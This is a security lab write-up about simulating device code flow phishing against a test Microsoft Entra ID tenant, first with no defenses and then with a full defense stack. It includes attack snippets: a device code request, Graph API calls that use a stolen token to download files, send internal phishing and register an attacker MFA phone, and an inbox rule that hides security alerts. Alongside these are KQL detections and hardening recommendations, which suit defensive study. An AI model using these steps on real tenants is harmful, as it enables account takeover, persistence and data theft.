# Device Code Flow Attack — Microsoft Entra ID Lab

**Organization:** EaglXXXeIT  
**Tenant:** eaglXXXeit.com  
**Lab Date:** April 14 – April 19, 2026  
**Type:** Red Team / Blue Team Simulation

---

## What This Is

This project documents a hands-on security lab where I simulated a Device Code Flow phishing attack against a real Microsoft Entra ID tenant — first with no defenses, then with a full security stack deployed. The goal was to understand how this attack works at a technical level, what the attacker sees, what the defender sees, and how to stop it.

This is not a theoretical exercise. Every screenshot, log entry, and alert in this repo came from a real simulation run against a live test environment.

---

## Why Device Code Flow Matters

Most people think phishing attacks need a fake login page. Device code flow phishing is different - it uses Microsoft's own legitimate login page. The victim sees no red flags. No fake site. No suspicious URL. Just a normal Microsoft sign-in prompt.

The attacker never touches the victim's password. They just wait while the victim unknowingly hands them a fully valid access token. Once they have it, they have everything - email, files, Teams messages, and the ability to move laterally inside the organization.

What makes this particularly dangerous is that the token comes with a refresh token attached. Even if the victim changes their password the next day, the attacker's session can remain active for up to 90 days.

---

## Business Impact — What Happens Without These Controls

Before getting into the technical details, it is worth understanding what a successful device code flow attack actually costs a business.

### Direct Financial Impact

| Scenario | Estimated Cost |
|---|---|
| Incident response and forensics | $50,000 — $200,000 |
| Legal and regulatory notifications | $20,000 — $100,000 |
| Regulatory fines (PIPEDA, GDPR) | $25,000 — $20,000,000+ |
| Business downtime and lost productivity | $10,000 — $50,000 per day |
| Ransomware deployment (common follow-on) | $500,000 — $5,000,000+ |
| Cyber insurance premium increase | 20% — 40% annual increase |
| Reputational damage and lost clients |

### What an Attacker Can Do With One Stolen Token

**Hour 1 — Establish foothold**
- Read all emails in the victim's inbox going back years
- Create inbox rules to silently delete Microsoft security alert emails so the victim never notices
- Register their own phone number as an MFA method so they keep access even after a password reset

**Hour 2 — Lateral movement**
- Send internal phishing emails to colleagues, executives, and finance teams appearing to come from a trusted internal sender
- Access SharePoint and Teams for internal documents, credentials, network diagrams, and financial records

**Hour 3 — Escalation**
- Search emails for passwords, VPN credentials, and banking information
- If victim has admin rights — access other accounts, disable security controls, create backdoor accounts
- Deploy ransomware or sell verified access to other threat actors

The average cost of a data breach in US in 2024 was **$6.32 million USD**. Device code flow attacks have been directly attributed to real-world breaches by threat actor groups including **Storm-2372**.

---

## Lab Timeline

| Date | Activity |
|---|---|
| April 14, 2026 | Phase 1 — attack simulated with no defenses, token obtained |
| April 14–18, 2026 | Security controls researched, planned, and deployed |
| April 19, 2026 | Phase 2 — attack re-simulated with full defense stack active |
| April 19, 2026 | Incident response — attacker IP logged, account auto-disabled |

---

## Attack Flow

```
Attacker                         Victim                        Microsoft
   │                                │                               │
   │── POST /devicecode ───────────────────────────────────────────▶│
   │◀─ user_code: F2GGN3YVQ ───────────────────────────────────────│
   │                                │                               │
   │── "Enter this code" ──────────▶│                               │
   │                                │── goes to devicelogin ───────▶│
   │                                │── enters code ───────────────▶│
   │                                │── completes MFA ─────────────▶│
   │                                │                               │
   │── POST /token (polling) ──────────────────────────────────────▶│
   │◀─ access_token + refresh_token ───────────────────────────────│
```

---


<img width="800"  alt="image" src="https://github.com/user-attachments/assets/f489058a-08bd-4eb0-8f97-333f5a01a893" />

> *Overview of attacker's infrastructure setup.*

---

## Phase 1 — Attack With No Defenses (April 14, 2026)

No Conditional Access policies were targeting device code flow. No Identity Protection risk policies were enforced. No Defender for Cloud Apps behavioral policies were active. The tenant was in its default state.

### Step 1 — Attacker Requests a Device Code

```bash
POST https://login.microsoftonline.com/common/oauth2/v2.0/devicecode
client_id = d35XXXd6-XXX-4102-XXXX-aad2292abXXX
scope     = openid profile email offline_access https://graph.microsoft.com/.default
```

Microsoft responded with user code `F2GGN3XXX` and a 15-minute window for the victim to authenticate.

### Step 2 — Victim Enters the Code

The victim was directed to `https://microsoft.com/devicelogin` and entered the code. Microsoft displays a warning telling users not to enter codes from untrusted sources — in most real-world cases this warning is ignored.


<img width="600" alt="Victim enters device code at microsoft.com/devicelogin" src="https://github.com/user-attachments/assets/25734385-9a6d-419c-bef1-285298bc0450" />

### Step 3 — Attacker Receives the Token

While the victim authenticated normally, the attacker's tool polled the token endpoint every 5 seconds. The moment the victim completed their login, Microsoft handed the token to the attacker.

---

<img width="800"  alt="image" src="https://github.com/user-attachments/assets/f60a4f94-17ae-4fcd-8fcf-40f1988d0d15" />

---

<img width="800" alt="Device code list confirmation" src="https://github.com/user-attachments/assets/1ff205a0-6795-44e2-a556-43f80a25d6a3" />

---

The attack took **2 minutes and 28 seconds** from code generation to token receipt. Status shows `SUCCESS` in green. The attacker now holds a valid `access_token` and `refresh_token` for the victim's account.

---

<img width="1756"  alt="image" src="https://github.com/user-attachments/assets/a2b77721-82e1-47d0-afb0-fe1f7be790d6" />

> *KQL showing attack was successful without security controls.*

---

At this point — no alerts fired. No CA policies triggered. No Sentinel rules matched. The sign-in logs showed a normal successful authentication. The attack was completely silent.

---

### Post-Compromise Actions

With a valid token, the following attacker actions were simulated to document the full blast radius:

**Inbox rule creation — hiding security alerts**

```powershell
New-InboxRule -Name "System Update" `
  -SubjectContainsWords "Microsoft account","unusual sign","security alert" `
  -DeleteMessage $true
```

Any Microsoft security notification sent to the victim is now silently deleted before they can read it.

---

**Sensitive file download — data exfiltration**

```bash
GET https://graph.microsoft.com/v1.0/me/drive/root/children
GET https://graph.microsoft.com/v1.0/me/drive/root/search(q='password')
GET https://graph.microsoft.com/v1.0/me/drive/items/{id}/content
Authorization: Bearer [STOLEN_TOKEN]
```
---
**Internal phishing — lateral movement**

```bash
POST https://graph.microsoft.com/v1.0/me/sendMail
Authorization: Bearer [STOLEN_TOKEN]

{
  "message": {
    "subject": "Action Required: Please Review This Document",
    "toRecipients": [{ "emailAddress": { "address": "cfo@eaglXXXit.com" } }]
  }
}
```

Sent from a legitimate internal account. No suspicious sender. No phishing indicators.

---

**MFA method registration — persistence**

```bash
POST https://graph.microsoft.com/v1.0/me/authentication/phoneMethods
Authorization: Bearer [STOLEN_TOKEN]

{ "phoneNumber": "+1-555-0199", "phoneType": "mobile" }
```

Attacker's number registered as an MFA factor. Survives a password reset.

---

## Phase 2 — Security Controls Deployed (April 14–18, 2026)

### Conditional Access Policies — 8 Policies, All Enforced


<img width="800" alt="image" src="https://github.com/user-attachments/assets/9c70a7ab-e009-4f27-bc80-57791d55cccc" />

---

| Policy | Purpose |
|---|---|
| All Users — Device Code Flow — Block Access | Blocks the device code protocol at the CA layer |
| All Users — Require Token Protection | Binds tokens to the enrolled device — prevents replay on attacker machine |
| All Users — Sign In Risk — Block Access | Blocks risky sign-ins via Identity Protection integration |
| All Users — All Apps — Require Strong MFA | Enforces phishing-resistant MFA across all applications |
| All Users — Device Registrations — Require MFA | Prevents attacker from registering their own MFA method |
| All Users — Legacy Auth Clients — Block Access | Blocks older protocols that bypass MFA |
| Block Login From External Corporate Network | Restricts sign-ins from outside trusted IP ranges |
| Corporate Network — MFA Required To Login | Requires MFA even inside the corporate network |

---
<img width="800" alt="image" src="https://github.com/user-attachments/assets/529e4c08-b8e4-4ec8-8f2a-6aa90cd49962" />

---

### Named Locations

<img width="800"  alt="image" src="https://github.com/user-attachments/assets/6da220e3-a608-466d-82c9-5ba71df632ef" />


Trusted IP ranges defined as `Corporate Network - Trusted` and marked as a trusted location. Any authentication from outside these ranges feeds into Identity Protection risk scoring and triggers additional CA controls.

### Microsoft Defender for Cloud Apps

Three policies configured:
- **Device Code Auth - Anomalous Location** — Custom activity policy alerting on native client logons from outside (Trusted Location)
- **Impossible Travel** — Built-in anomaly detection, sensitivity High
- **Mass Download by Single User** — Built-in detection for bulk file exfiltration, sensitivity High

---
<img width="800"  alt="image" src="https://github.com/user-attachments/assets/487d3aa8-7a59-47cc-aad9-104560f786de" />

---
### Microsoft Sentinel — KQL Detection Rules

Four analytics rules deployed covering successful device code authentications, blocked attempts, inbox rule creation, and new MFA method registrations. 

---
<img width="600" alt="image" src="https://github.com/user-attachments/assets/d779e62f-2455-4dea-ab7e-cf806f10640c" />

---

<img width="800"  alt="image" src="https://github.com/user-attachments/assets/f5a959db-8689-4c54-9ff1-efcda9521099" />

---

### Privileged Identity Management

All privileged roles converted from permanent active assignment to eligible, requiring just-in-time activation with MFA and justification before admin rights become active.

---

## Phase 2 — Attack Re-Simulation (April 19, 2026)

The exact same attack was repeated with all controls active. Same tool. Same client ID. Same target account.

### What the Victim Saw

The victim entered the new device code and attempted to authenticate. This time, instead of completing successfully, Microsoft returned:

---

<img width="800"  alt="image" src="https://github.com/user-attachments/assets/a73df756-961b-4071-b6f9-ac950d41ff24" />


> *Your sign-in was successful but your admin requires the device requesting access to be managed by EagleSecureIT to access this resource.*

---

The victim's credentials were correct. Their MFA passed. But the token was refused because the device initiating the request, the attacker's unmanaged machine — was not enrolled in the tenant. The Token Protection CA policy blocked issuance at the final step.

---

### What the Attacker Saw

The attacker's tool continued polling for 15 minutes. It never received a token.

---

<img width="800"  alt="image" src="https://github.com/user-attachments/assets/98fe7e97-92fa-4fa0-923d-d0de8b38ad57" />


Phase 1 - green - `SUCCESS`. Phase 2 - red - `EXPIRED`. The attacker got nothing.

---
### What Sentinel Logged

```kql
SigninLogs
| where TimeGenerated > ago(1h)
| where UserPrincipalName contains "johnsmith"
| project TimeGenerated, IPAddress, Location, ResultSignature, AppDisplayName
```


<img width="800"  alt="image" src="https://github.com/user-attachments/assets/04bf1339-4295-4c10-abd4-601f9476f0b9" />

---

| Field | Value |
|---|---|
| TimeGenerated | Apr 19, 2026 2:11:19 |
| IPAddress | 172.81.XX.XXX |
| Location | US |
| ResultSignature | FAILURE |
| AppDisplayName | Microsoft Office |

The attacker's IP is now a documented indicator of compromise. Location shows United States, outside the trusted Country perimeter.

An enhanced query adding `AuthenticationProtocol` returned a value of `none` rather than `deviceCode`:

---
<img width="800"  alt="image" src="https://github.com/user-attachments/assets/2424fbd6-19f2-4bd6-91cd-2d365b096b20" />


This is expected when CA blocks early in the pipeline - the protocol field is never populated. This led to the detection gap finding documented below.

---
### What Defender for Cloud Apps Captured


<img width="800" alt="image" src="https://github.com/user-attachments/assets/d8b529e8-babe-41f0-ac3a-1d57bc49cad3" />

---

| Field | Value |
|---|---|
| Activity | Failed log on |
| User | john smith |
| Date | Apr 19, 2026 2:09 PM |
| IP Address | 172.81.XXX.XXX |
| Location | United States, Arizona |
| Device | PC, OS X 10, Chrome 144.0 |
| ISP | XXX XXXX XXXXXX |
| Matched policies | Policies matched |

The attacker's machine was fingerprinted. ISP flagged as a dynamic DNS provider — consistent with attack tooling or VPN use.

### Account Auto-Disabled

Identity Protection evaluated the sign-in risk and automatically disabled the johnsmith account as a response action. This was confirmed when an RDP connection to the environment returned:

---
<img width="800" alt="image" src="https://github.com/user-attachments/assets/3cb091ef-641b-4277-9da6-f89297988002" />


> *We couldn't connect to the remote PC because your account has been disabled. Error code: 0xb07*

---

The account was re-enabled by the administrator after confirming the attack was contained.

---

## Detection Gap Found and Fixed

The original Sentinel rule used `where ResultType == 0` success only. Because the CA policy blocked the Phase 2 attack before a token was issued, the result was a failure code, and no alert fired.

This means blocked attacks were completely invisible to the SIEM. The security team would not know they were being targeted.

**Fixed rule — covers both outcomes:**

```kql
SigninLogs
| where AuthenticationProtocol == "deviceCode"
    or ResultDescription has "AADSTS70016"
| where ResultType != 50053
| extend Outcome = case(
    ResultType == 0,     "SUCCESS - Token Issued",
    ResultType == 50097, "BLOCKED - Device Compliance",
    ResultType == 53003, "BLOCKED - Conditional Access",
    "BLOCKED - Other Failure")
| project TimeGenerated, UserPrincipalName, IPAddress,
          Location, AppDisplayName, Outcome, ResultType
| order by TimeGenerated desc
```

---

## Before vs After

| | April 14 — No Defenses | April 19 — Defended |
|---|---|---|
| Token issued | ✅ Yes — full access | ❌ No — blocked |
| Device code status | SUCCESS | EXPIRED |
| Inbox rules created | Possible | Prevented |
| Files downloaded | Possible | Prevented |
| Internal phishing sent | Possible | Prevented |
| MFA method registered | Possible | Prevented |
| Attacker IP captured | No | 172.81.XXX.XXX — Arizona, US |
| Sentinel alert | None | FAILURE logged |
| Defender alert | None | Failed logon — attacker fingerprinted |
| Account status | Active | Auto-disabled by Identity Protection |

---

## Recommendations

| Priority | Control | Effort |
|---|---|---|
| 1 | Block device code flow via Conditional Access | Low |
| 2 | Enable Token Protection CA policy | Low |
| 3 | Update Sentinel rules to cover blocked attempts | Low |
| 4 | Configure Named Locations with trusted IP ranges | Low |
| 5 | Enable Continuous Access Evaluation (CAE) | Low |
| 6 | Convert privileged roles to PIM eligible assignments | Medium |
| 7 | Disable device code flow at tenant level if no legitimate use | Medium |
| 8 | Deploy Defender for Cloud Apps behavioral policies | Medium |
| 9 | Move privileged accounts to FIDO2 / Passkeys | High |
| 10 | Re-run this simulation every 6 months | Low |

---

> **Disclaimer:** This lab was conducted against an authorized test environment. All activity was performed on accounts and systems owned by the lab operator. Do not replicate against any environment without explicit written authorization.
